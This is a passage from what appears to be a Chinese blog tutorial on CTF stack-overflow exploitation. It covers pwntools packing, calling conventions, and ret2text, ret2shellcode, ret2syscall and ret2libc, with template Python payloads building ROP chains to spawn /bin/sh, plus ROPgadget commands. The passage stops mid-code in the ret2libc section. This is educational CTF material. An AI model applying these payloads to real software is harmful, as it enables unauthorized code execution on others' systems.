位程序的数据进行打包，处理后形成<strong>小端序</strong>字节流</li></ol><p>例如 <code>p32(0xdeadbeef)</code> 将被转换为 <code>b&#39;\xef\xbe\xad\xde</code>‘ 的字节流，发送到目标机器的内存中为：<code>0xef 0xbe 0xad 0xde</code></p><ol start="2"><li><code>p64()</code> 是对 64 位程序的数据进行打包，处理后形成<strong>小端序</strong>字节流</li></ol><p>例如 <code>p64(0xfaceb00cbabe)</code> 将被转换为 <code>b&#39;\xbe\xba\x0c\xb0\xce\xfa\x00\x00&#39;</code> 的字节流，发送到目标机器的内存中为：<code>0xbe 0xba 0x0c 0xb0 0xce 0xfa 0x00 0x00</code></p><ol start="3"><li><code>u32</code> 是对 32 位程序发送过来的<strong>小端序</strong>字节流进行解包，处理后得到十进制数据</li></ol><p>例如 <code>u32(b&#39;\xef\xbe\xad\xde&#39;)</code> 将被转换为 <code>3735928559</code> 的数据（十进制）</p><ol start="4"><li><code>u64</code> 是对 64 位程序发送过来的<strong>小端序</strong>字节流进行解包，处理后得到十进制数据</li></ol><p>例如 <code>u64(b&#39;\xbe\xba\x0c\xb0\xce\xfa\x00\x00&#39;)</code> 将被转换为 <code>275765623831230</code> 的数据（十进制）</p><hr><h2 id="函数调用的区别"><a href="#函数调用的区别" class="headerlink" title="函数调用的区别"></a>函数调用的区别</h2><h3 id="32-位调用方式"><a href="#32-位调用方式" class="headerlink" title="32 位调用方式"></a>32 位调用方式</h3><blockquote><p>32 位程序优先使用栈来传递参数，参数从右往左压入栈，然后执行 call 指令跳转到函数位置</p><p><strong>32 位程序只需向栈中填充数据，直至覆盖返回地址，即可劫持栈帧，后面跟上函数地址、参数地址即可</strong></p></blockquote><ol><li>将参数全部压入栈中</li><li>靠近 call 指令的是第一个参数</li><li>然后按顺序 call</li></ol><hr><h3 id="64-位调用方式"><a href="#64-位调用方式" class="headerlink" title="64 位调用方式"></a>64 位调用方式</h3><blockquote><p>64 位程序优先使用寄存器来传递参数，前 6 个参数是通过寄存器（<code>RDI、RSI、RDX、RCX、R8、R9</code>）传递的，多余的参数才通过栈传递</p><p><strong>64 位程序向栈中填充数据覆盖返回地址后，首先要将参数弹出到寄存器，然后再跟上函数地址调取寄存器中的参数</strong></p></blockquote><ol><li><code>RDI</code> 中存放第 1 个参数</li><li><code>RSI</code> 中存放第 2 个参数</li><li><code>RDX</code> 中存放第 3 个参数</li><li><code>RCX</code> 中存放第 4 个参数</li><li><code>R8</code> 中存放第 5 个参数</li><li><code>R9</code> 中存放第 6 个参数</li><li>如果还有更多的参数，再把多出来那几个参数像 32 位程序一样压入栈中</li><li>然后按顺序 call</li></ol><hr><h1 id="Ret2text"><a href="#Ret2text" class="headerlink" title="Ret2text"></a>Ret2text</h1><blockquote><p>Ret2text（return to .text），控制程序执行程序本身已有的的代码</p><p>适用于程序中给出了 <code>system()</code> 函数，有 <code>&quot;/bin/sh&quot;</code>（如果没有，也可以自己写到 .bss 段上或某个变量中，并且要可以找到其地址），或者直接有构造好的 <code>system(&quot;/bin/sh&quot;)</code></p></blockquote><h2 id="32-位-ROP-构造"><a href="#32-位-ROP-构造" class="headerlink" title="32 位 ROP 构造"></a>32 位 ROP 构造</h2><blockquote><p>假设栈开辟的空间为 20 字节，ebp 的大小为 4 字节</p></blockquote><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E1.png" alt="栈溢出漏洞1.png"></p><ul><li>system_addr 为 <code>system()</code> 函数的地址，bin_sh_addr 为 <code>&quot;/bin/sh&quot;</code> 的地址<br> 则构造如下 payload 实现 <code>system(&quot;/bin/sh&quot;)</code>：</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 直接给出了构造好的system("/bin/sh")</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x20</span> <span class="token operator">+</span> <span class="token number">0x4</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>system_bin_sh_addr<span class="token punctuation">)</span><span class="token comment"># 没有system("/bin/sh")，但可以自己构造</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x20</span> <span class="token operator">+</span> <span class="token number">0x4</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'aaaa'</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>bin_sh_addr<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>如果是正常调用 <code>system()</code> 函数，我们调用的时候会有一个对应的返回地址，这里以填充的 <code>b&#39;aaaa&#39;</code> 作为虚假的返回地址（保证 4 字节即可），其后参数为提供给 <code>system()</code> 函数的参数内容</p><p>这里的 <code>b&#39;aaaa&#39;</code> 其实是填充一个 4 字节的数据，写成 <code>p32(0)</code> 或者 <code>p32(0xdeadbeef)</code> 也是一样的</p></blockquote><ul><li>以利用 <code>gets()</code> 函数向 bss 段写入 “<code>/bin/sh</code>“ 为例：</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python">payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x20</span> <span class="token operator">+</span> <span class="token number">0x4</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>gets_plt_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>pop_ebx_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><hr><h2 id="64-位-ROP-构造"><a href="#64-位-ROP-构造" class="headerlink" title="64 位 ROP 构造"></a>64 位 ROP 构造</h2><blockquote><p>假设栈开辟的空间为 20 字节，rbp 的大小为 8 字节</p></blockquote><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E2.png" alt="栈溢出漏洞2.png"></p><ol><li>首先需要将构造的参数放到第一个参数所在的寄存器：RDI</li></ol><p>可以__通过 <code>pop rdi ; ret</code> 指令将栈上的数据弹出到 RDI 寄存器来实现__</p><p>使用 <code>ROPgadget --binary 文件名 | grep &#39;pop rdi&#39;</code> 进行寻找，获得 <code>pop rdi ; ret</code> 指令的地址</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E8.png" alt="栈溢出漏洞8.png"></p><p>也可以使用 <code>ROPgadget --binary 文件名 --only &#39;pop|ret&#39; | grep pop</code> 寻找全部可利用的寄存器指令</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E9.png" alt="栈溢出漏洞9.png"></p><ol start="2"><li>system_addr 为 <code>system()</code> 函数的地址，bin_sh_addr 为 <code>&quot;/bin/sh&quot;</code> 的地址，pop_rdi_addr 为 <code>pop rdi ; ret</code> 指令的地址<br>则构造如下 payload 实现 <code>system(&quot;/bin/sh&quot;)</code>：</li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 直接给出了构造好的system("/bin/sh")</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x20</span> <span class="token operator">+</span> <span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system_bin_sh_addr<span class="token punctuation">)</span><span class="token comment"># 没有system("/bin/sh")，但可以自己构造</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x20</span> <span class="token operator">+</span> <span class="token number">0x8</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bin_sh_addr<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>这里通过 <code>p64(pop_rdi_addr) + p64(bin_sh_addr)</code> 将 RDI 的内容设置为 <code>&quot;/bin/sh&quot;</code>，最后 ret 回 <code>system_addr</code> 的地址，从而让 <code>system()</code> 将 RDI 中的 <code>&quot;/bin/sh&quot;</code> 作为参数执行</p><p>注意：<br>glibc2.27 以后引入 <code>xmm</code> 寄存器，记录程序状态，在执行 <code>system()</code> 函数时会执行 <code>movaps</code> 指令，要求 <code>rsp</code> 按 16 字节对齐，需要在进入 <code>system()</code> 函数之前加上一个 <code>ret</code> 指令的地址来平衡堆栈 <em>（仅 64 位需要）</em></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x20</span> <span class="token operator">+</span> <span class="token number">0x8</span><span class="token punctuation">)</span>  payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bin_sh_addr<span class="token punctuation">)</span>  payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>ret_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span> <span class="token comment"># 加一个 p64(ret_addr) 用于平衡堆栈</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><em>详见《64位程序PWN中的堆栈平衡》</em></p></blockquote><hr><h1 id="Ret2shellcode"><a href="#Ret2shellcode" class="headerlink" title="Ret2shellcode"></a>Ret2shellcode</h1><blockquote><p>Ret2shellcode（return to shellcode），控制程序执行 shellcode 代码</p><p>适用于程序中没有 <code>system()</code> 函数和 <code>&quot;/bin/sh&quot;</code>，需要自己填充 shellcode 并引导去程序执行触发</p><p><strong>首先必须要保证写入 shellcode 的区域具有可执行权限</strong></p></blockquote><h2 id="ROP-构造"><a href="#ROP-构造" class="headerlink" title="ROP 构造"></a>ROP 构造</h2><blockquote><p>此方法在 32 位和 64 位程序中构造方式是类似的，shellcode 的构造详见《<em>Pwntools的使用技巧</em>》</p></blockquote><ol><li><p>首先在 gdb 中，使用 <code>b main</code> 设置断点，然后 <code>run</code> 运行程序<br>  执行 <code>vmmap</code> 查看地址段是否有执行权限，如果 <code>Perm</code> 中带有 <code>x</code>，表示该地址段可以执行</p></li><li><p>假设栈开辟的空间为 20 字节，rbp 的大小为 4、8 字节</p></li></ol><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E3.png" alt="栈溢出漏洞3.png"></p><p>shellcode_addr 为写入的 <code>shellcode</code> 所在的地址</p><p>则构造如下 payload 实现 <code>system(&quot;/bin/sh&quot;)</code>：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 32位</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x20</span> <span class="token operator">+</span> <span class="token number">0x4</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>shellcode_addr<span class="token punctuation">)</span><span class="token comment"># 64位</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x20</span> <span class="token operator">+</span> <span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>shellcode_addr<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>用此方法需要注意空间大小是否足够 <code>shellcode</code> 写入</p></blockquote><hr><h1 id="Ret2syscall"><a href="#Ret2syscall" class="headerlink" title="Ret2syscall"></a>Ret2syscall</h1><blockquote><p>Ret2syscall（return to syscall），控制程序执行系统调用来获取 shell。可以理解为拼接成一个系统调用的栈，在寄存器中带入指定的参数拼接成关键的系统函数，最后再寻找 <code>int 0x80/syscall</code> 的地址，从而执行这些函数。</p><p><strong>Ret2syscall 可用于绕过沙箱保护，或者针对静态编译等没有 libc 的场景</strong></p><p>适用于 32 位程序中有 <code>int 0x80</code> 或者 64 位程序中有 <code>syscall</code>，要能找到 <code>&quot;pop rax ; ret&quot;</code></p><p>例如构造：<code>execve(&quot;/bin/sh&quot;, 0, 0)</code></p></blockquote><h2 id="32-位-ROP-构造-1"><a href="#32-位-ROP-构造-1" class="headerlink" title="32 位 ROP 构造"></a>32 位 ROP 构造</h2><blockquote><p>32 位程序参数的构造顺序：<code>eax --&gt; ebx --&gt; ecx --&gt; edx</code>，返回为 <code>int 0x80</code></p><p>假设栈开辟的空间为 20 字节，ebp 的大小为 4 字节</p></blockquote><ul><li>32 位常用 syscall 格式如下：</li></ul><table><thead><tr><th align="left">eax</th><th align="left">system call</th><th align="left">ebx</th><th align="left">ecx</th><th align="left">edx</th></tr></thead><tbody><tr><td align="left">3</td><td align="left"><code>read()</code></td><td align="left">unsigned int fd</td><td align="left">char *buf</td><td align="left">size_t count</td></tr><tr><td align="left">4</td><td align="left"><code>write()</code></td><td align="left">unsigned int fd</td><td align="left">const char *buf</td><td align="left">size_t count</td></tr><tr><td align="left">5</td><td align="left"><code>open()</code></td><td align="left">const char *filename</td><td align="left">int flags</td><td align="left">int mode</td></tr></tbody></table><p>更多 32 位 syscall 格式见：<a href="https://github.com/torvalds/linux/blob/16f73eb02d7e1765ccab3d2018e0bd98eb93d973/arch/x86/entry/syscalls/syscall_32.tbl">linux&#x2F;syscall_32.tbl · torvalds&#x2F;linux · GitHub</a></p><p>在 Linux 下可以使用如下命令查看：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> /usr/include/x86_64-linux-gnu/asm/unistd_32.h<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>以 <code>read()</code> 系统调用将输入写到 bss 段为例：</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python">payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x20</span> <span class="token operator">+</span> <span class="token number">0x4</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop_eax_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x3</span><span class="token punctuation">)</span>   <span class="token comment"># 32 位的 read() 系统调用号为 3</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop_edx_ecx_ebx_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>  <span class="token comment"># bss_addr必须是一个可写入的地址</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>int_0x80_addr<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ol><li>首先，<code>execve()</code> 函数在 32 位的系统调用号是 11，也就是 0xb，所以我们要做的是使：<br><strong>eax</strong> &#x3D; 0xb<br><strong>ebx</strong> &#x3D; bin_sh_addr<br><strong>ecx</strong> &#x3D; 0<br><strong>edx</strong> &#x3D; 0<br>对应的汇编代码为：</li></ol><pre class="line-numbers language-c" data-language="c"><code class="language-c">pop eax   <span class="token comment">// 系统调用号载入，execve为0xb </span>pop ebx   <span class="token comment">// 第一个参数，'/bin/sh'的地址</span>pop ecx   <span class="token comment">// 第二个参数，0 </span>pop edx   <span class="token comment">// 第三个参数，0 </span><span class="token keyword">int</span> <span class="token number">0x80</span>  <span class="token comment">// int 0x80是32位的系统调用方式，同样通过eax传递调用号</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li>寻找用于将数据出栈到寄存器的指令：</li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python">ROPgadget <span class="token operator">-</span><span class="token operator">-</span>binary 文件名 <span class="token operator">-</span><span class="token operator">-</span>only <span class="token string">'pop|ret'</span> <span class="token operator">|</span> grep <span class="token string">'eax'</span><span class="token comment"># 假设获取的是 pop eax ; ret</span>ROPgadget <span class="token operator">-</span><span class="token operator">-</span>binary 文件名 <span class="token operator">-</span><span class="token operator">-</span>only <span class="token string">'pop|ret'</span> <span class="token operator">|</span> grep <span class="token string">'ebx'</span><span class="token comment"># 假设获取的是 pop edx ; pop ecx ; pop ebx ; ret</span>ROPgadget <span class="token operator">-</span><span class="token operator">-</span>binary 文件名 <span class="token operator">-</span><span class="token operator">-</span>string <span class="token string">'/bin/sh'</span>  <span class="token comment"># 寻找'/bin/sh'的地址</span>ROPgadget <span class="token operator">-</span><span class="token operator">-</span>binary 文件名 <span class="token operator">-</span><span class="token operator">-</span>only <span class="token string">'int'</span>  <span class="token comment"># 寻找int 0x80的地址</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="3"><li>根据实际 gadget 情况编写 payload，以上述指令为例：</li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python">payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x20</span> <span class="token operator">+</span> <span class="token number">0x4</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop_eax_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0xb</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop_edx_ecx_ebx_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>bin_sh_addr<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>int_0x80_addr<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="64-位-ROP-构造-1"><a href="#64-位-ROP-构造-1" class="headerlink" title="64 位 ROP 构造"></a>64 位 ROP 构造</h2><blockquote><p>64 位程序参数的构造顺序：<code>rdi --&gt; rsi --&gt; rdx --&gt; rcx --&gt; r8 --&gt; r9</code>，返回为 <code>syscall</code></p><p>假设栈开辟的空间为 20 字节，rbp 的大小为 8 字节</p></blockquote><ul><li>64 位常用 syscall 格式如下：</li></ul><table><thead><tr><th align="left">rax</th><th align="left">system call</th><th align="left">rdi</th><th align="left">rsi</th><th align="left">rdx</th></tr></thead><tbody><tr><td align="left">0</td><td align="left"><code>read()</code></td><td align="left">unsigned int fd</td><td align="left">char *buf</td><td align="left">size_t count</td></tr><tr><td align="left">1</td><td align="left"><code>write()</code></td><td align="left">unsigned int fd</td><td align="left">const char *buf</td><td align="left">size_t count</td></tr><tr><td align="left">2</td><td align="left"><code>open()</code></td><td align="left">const char *filename</td><td align="left">int flags</td><td align="left">int mode</td></tr></tbody></table><p>更多 64 位 syscall 格式见：<a href="https://github.com/torvalds/linux/blob/16f73eb02d7e1765ccab3d2018e0bd98eb93d973/arch/x86/entry/syscalls/syscall_64.tbl">linux&#x2F;syscall_64.tbl · torvalds&#x2F;linux · GitHub</a></p><p>在 Linux 下可以使用如下命令查看：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> /usr/include/x86_64-linux-gnu/asm/unistd_64.h<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>以 <code>read()</code> 系统调用将输入写到 bss 段为例：</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python">payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x20</span> <span class="token operator">+</span> <span class="token number">0x8</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rax_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">)</span>   <span class="token comment"># 64 位的 read() 系统调用号为 0</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdx_rsi_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span>  <span class="token comment"># bss_addr必须是一个可写入的地址</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>   <span class="token comment"># 文件描述符，0 表示获取屏幕输入</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>syscall_addr<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li>首先，<code>execve()</code> 函数在 64 位的系统调用号是 59，也就是 0x3b，所以我们要做的是使：<br><strong>rax</strong> &#x3D; 0x3b<br><strong>rdi</strong> &#x3D; bin_sh_addr<br><strong>rsi</strong> &#x3D; 0<br><strong>rdx</strong> &#x3D; 0<br>对应的汇编代码为：</li></ol><pre class="line-numbers language-c" data-language="c"><code class="language-c">pop rax   <span class="token comment">// 系统调用号载入，execve为0x3b </span>pop rdi   <span class="token comment">// 第一个参数，'/bin/sh'的地址</span>pop rsi   <span class="token comment">// 第二个参数，0 </span>pop rdx   <span class="token comment">// 第三个参数，0 </span>syscall  <span class="token comment">// syscall是64位的系统调用方式，同样通过rax传递调用号</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li>寻找用于将数据出栈到寄存器的指令：</li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python">ROPgadget <span class="token operator">-</span><span class="token operator">-</span>binary 文件名 <span class="token operator">-</span><span class="token operator">-</span>only <span class="token string">'pop|ret'</span> <span class="token operator">|</span> grep <span class="token string">'rax'</span><span class="token comment"># 假设获取的是 pop rax ; ret</span>ROPgadget <span class="token operator">-</span><span class="token operator">-</span>binary 文件名 <span class="token operator">-</span><span class="token operator">-</span>only <span class="token string">'pop|ret'</span> <span class="token operator">|</span> grep <span class="token string">'rdi'</span><span class="token comment"># 假设获取的是 pop rdx ; pop rsi ; pop rdi ; ret</span>ROPgadget <span class="token operator">-</span><span class="token operator">-</span>binary 文件名 <span class="token operator">-</span><span class="token operator">-</span>string <span class="token string">'/bin/sh'</span>  <span class="token comment"># 寻找'/bin/sh'的地址</span>ROPgadget <span class="token operator">-</span><span class="token operator">-</span>binary 文件名 <span class="token operator">-</span><span class="token operator">-</span>only <span class="token string">'ret'</span>  <span class="token comment"># 寻找ret的地址</span>ROPgadget <span class="token operator">-</span><span class="token operator">-</span>binary 文件名 <span class="token operator">-</span><span class="token operator">-</span>only <span class="token string">'syscall'</span>  <span class="token comment"># 寻找syscall的地址</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="3"><li>根据实际 gadget 情况编写 payload，以上述指令为例：</li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python">payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x20</span> <span class="token operator">+</span> <span class="token number">0x8</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rax_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x3b</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdx_rsi_rdi_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bin_sh_addr<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>syscall_addr<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="Ret2libc"><a href="#Ret2libc" class="headerlink" title="Ret2libc"></a>Ret2libc</h1><blockquote><p>Ret2libc（return to libc），控制函数执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)</p><p>适用于程序中没有 <code>system()</code> 函数和 <code>&quot;/bin/sh&quot;</code>，或者程序开启了 <code>PIE</code> 地址随机化，需要泄露程序运行时的地址来计算偏移地址</p></blockquote><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E6.png" alt="栈溢出漏洞6.png"></p><p><em>一般 ret2libc 常用的方法是采用 got 表地址泄露，不过由于 libc 的延迟绑定机制，我们需要泄漏已经执行过的函数的地址。</em> 最简单的，可以泄露 <code>__libc_start_main</code> 函数的 got 表地址，因为它是程序最初被执行的地方，一定会被执行（当然，泄露其他的函数地址也是可以的）</p><blockquote><p>注意：<br>通过 ret2libc 计算出 libc 基地址时，**libc 基地址 <code>libcbase</code> 最后三位一般是 <code>000</code>**，可用于判断是否计算正确，libc 基地址可以在 GDB 中使用 <code>vmmap</code> 进行查看</p><p>另外，<strong>libc 中的函数偏移在加载到内存后地址最后三位是不会变的</strong>，例如：<code>system()</code> 函数在 libc 中偏移量为 0x48<em>E50</em>，则加载到内存中可能为 0xF7D1B<em>E50</em></p><p><mark>与操作系统的 4 KB 分页机制有关，4 KB &#x3D; 4 * 1024 (D) &#x3D; 1000 (H)</mark></p></blockquote><h2 id="32-位-ROP-构造-2"><a href="#32-位-ROP-构造-2" class="headerlink" title="32 位 ROP 构造"></a>32 位 ROP 构造</h2><blockquote><p>假设栈开辟的空间为 20 字节，ebp 的大小为 4 字节</p></blockquote><ol><li>首先需要泄露出一个函数的真实地址<br>这里以利用 <code>write()</code> 函数来泄露 <code>read()</code> 函数的 got 表地址为例（泄露其他函数也是可以的），最后再次返回到 <code>main()</code> 函数</li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python">payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x20</span> <span class="token operator">+</span> <span class="token number">0x4</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0x1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x4</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>这里 <code>p32(0x1)</code>、<code>p32(elf.got[&#39;write&#39;])</code>、<code>p32(0x4)</code> 是提供给 <code>write()</code> 函数的三个参数  </p><p><code>ssize_t write(int fd,const void *buf,size_t count)</code>  </p><p>其中，<strong>文件描述符 fd &#x3D; 1 表示输出到屏幕</strong></p></blockquote><ol start="2"><li>接收 <code>write()</code> 函数打印出的 <code>read@got</code> 的地址</li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python">read_real_addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="3"><li>根据泄露的地址获得程序对应的 libc 版本，第二个参数一般为已泄露的实际地址，然后根据 libc 确定 <code>read()</code> 的偏移地址，计算出本次加载进内存后的偏移量，并反推出其他函数的真实地址</li></ol><p><strong>如果已知 libc 可直接使用，如果未知则使用 LibcSearcher</strong></p><pre class="line-numbers language-python" data-language="python"><code 